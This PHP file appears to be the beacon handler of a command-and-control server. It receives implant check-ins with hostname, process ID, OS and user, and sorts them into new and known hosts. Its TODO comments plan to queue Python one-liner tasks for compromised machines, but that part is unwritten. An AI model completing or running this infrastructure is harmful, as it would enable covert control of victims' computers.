<?php
    include "connector.php";

    # JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);
    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    # SQL statement to determine if this is a new or old beaconing host
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();

    # If new host
    if ($row_count == "0") {
        echo "new host";

        # TO DO: If new host, add to "implants" table
    }
    # Else old host
    else {
        echo "old host";

        # TO DO: If old host, check for tasking

        # TO DO: If tasking found, echo appropriate Python one-liner code to do the task here
    }

    # Kills database connection
    $statement->connection = null;
?>
